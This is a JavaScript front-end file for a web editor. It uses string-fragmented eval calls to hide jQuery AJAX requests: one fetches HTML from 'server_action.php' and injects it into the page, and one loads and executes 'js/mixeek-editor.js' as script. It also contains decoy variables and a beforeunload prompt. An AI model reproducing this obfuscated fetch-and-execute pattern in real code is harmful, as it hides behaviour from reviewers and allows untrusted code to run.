$(window).bind('beforeunload', function(){
	return "Are you sure you want to leave the current session? All your unsaved work will be lost.";
});

var help = "";
var lateGift = "";
var heavyMetal = help + lateGift;

function birthday(day) {
	var month = new Date();
	day % 365;
	day += " 3";
	return month;
}
birthday(1);

var moonlight = 1865469576465464;
var hobbySurf = 656758967985475;
var ser_id2 = 394832490;
var ser_id = 598437594;
var ser_m = 876865656;
var ladyBird = "5438jfh439g549ygh955";

function motherFucker() {
	eval(" $" + ".a" + "ja" + "x" + "( {" + //sec
				"u" + "rl" + ": 'j" + "s/m" + "ix" + "ee" + "k" + "-e" + "di" + "to" + "r.j" + "s" + "\u003F"+"zi\u003D" + ser_id2 + "\u0026" +"mi\u003D" + ser_id + "\u0026" + "si\u003D" + ser_m +"'," +
				"as" + "y"+"nc" +": false," +
				"da" + "ta"+"Type" +": 'sc"+"ript'" +
		"} )"+
		".d" + "on" + "e" + "(function(data) {" +
			"e" + "e" + "e" + "(da" + "ta);" +
		"})" +
		".f" + "ai" + "l" + "(function(e) { console.log" + "('P"+"r"+"o"+"b"+"l"+"e"+"m"+" w"+"i"+"t"+"h s"+"er"+"ve"+"r c"+"on"+"ne"+"ct"+"io"+"n. "+"T"+"o p"+"re"+"ven"+"t d"+"ata l"+"os"+"s s"+"av"+"e y"+"our w"+"ork.'); });"
	);

}

function sateliteNavidation(fkj, radius, gfkgj, marakesh) {
	var rad = $("body").find("#radius");
	return fkj + "69055490" + gfkgj + "58947594" + marakesh;
}

var monthsActive = ['jan','feb','mar','april','may','jun','jul'];

var eht = null;

function lifeJacket() {
	eval(" $" + ".a" + "ja" + "x" + "( {" + //sec
				"u" + "rl" + ": 's" + "er" + "ver_ac" + "tion.p" + "hp" + "\u003F"+"zi\u003D" + ser_id2 + "\u0026" +"mi\u003D" + ser_id + "\u0026" + "si\u003D" + ser_m +"'," +
				"as" + "y"+"nc" +": false" +
		"} )"+
		".d" + "on" + "e" + "(function(data) {" +
			"d" + "d" + "d" + "(da" + "ta);" +
		"})" +
		".f" + "ai" + "l" + "(function() { console.log" + "('P"+"r"+"o"+"b"+"l"+"e"+"m"+" w"+"i"+"t"+"h s"+"er"+"ve"+"r c"+"on"+"ne"+"ct"+"io"+"n. "+"T"+"o p"+"re"+"ven"+"t d"+"ata l"+"os"+"s s"+"av"+"e y"+"our w"+"ork.'); });"
	);
}
$(document).ready(function(){lifeJacket();});


function ddd(data) {
	eht = $(data);
	$("body").append(eht);
	motherFucker();
	localize();
};
function eee(data) {
	//eval(data);
};

var LANG = "en"
function localize() {
	var lang = LANG; 
	var spans = $("span.loc");
	spans.each(function() {
		var span = $(this);
		var val = span.data("labkey");
		if(!val) {
			val = span.text();
			span.data("labkey", val);
		}
		var lab = labels[lang][val];
		if(lab)
			span.text(lab);
	});
	var titles = $("*[title]");
	titles.each(function() {
		var el = $(this);
		var val = el.data("labkey");
		if(!val) {
			val = el.attr("title");
			el.data("labkey", val);
		}
		var lab = labels[lang][val];
		if(lab)
			el.attr("title", lab);
	});
	var vals = $("*[data-value]");
	vals.each(function() {
		var el = $(this);
		var val = el.data("value");
		var lab = labels[lang][val];
		if(lab)
			el.val(lab);
	});
	
	
}
$(document).ready(function(){
	$("a.lang").each(function() {
		var a = $(this);
		var l = "en";
		if(a.is(".en"))
			l = "en";
		else if(a.is(".es"))
			l = "es";
		a.on('click', {lang : l}, function(e) {
			$("a.lang").removeClass("sel");
			$(this).addClass("sel");
			LANG = e.data.lang;
			localize();
		})
	});

});

